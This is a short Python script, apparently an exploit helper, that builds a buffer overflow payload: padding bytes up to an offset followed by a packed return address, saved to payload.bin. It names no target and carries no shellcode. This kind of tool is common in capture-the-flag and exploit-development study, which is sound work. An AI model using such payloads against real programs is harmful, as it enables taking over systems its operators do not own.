
import struct
import sys

def generate_payload(offset, address, is_64bit=True, little_endian=True):
    """
    Generate a payload for a buffer overflow exploit.

    :param offset: The offset to the RIP.
    :param address: The address of the function to jump to.
    :param is_64bit: Set to True for 64-bit, False for 32-bit.
    :param little_endian: Set to True for little-endian, False for big-endian.
    :return: The generated payload.
    """

    # Fill up to the offset with 'A's or any other character
    payload = b"A" * offset

    # Convert the address to binary format, considering endianness and architecture
    if little_endian:
        format_str = "<Q" if is_64bit else "<I"  # Little-endian
    else:
        format_str = ">Q" if is_64bit else ">I"  # Big-endian

    addr_bin = struct.pack(format_str, address)

    # Append the address to the payload
    payload += addr_bin

    return payload

# Example usage
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <offset> <address> <is_64bit>")
        sys.exit(1)

    offset = int(sys.argv[1])
    address = int(sys.argv[2], 16)  # Address is expected in hexadecimal
    is_64bit = sys.argv[3].lower() == 'true'

    # Generate the payload
    payload = generate_payload(offset, address, is_64bit)

    # Save the payload to a file
    with open('payload.bin', 'wb') as f:
        f.write(payload)
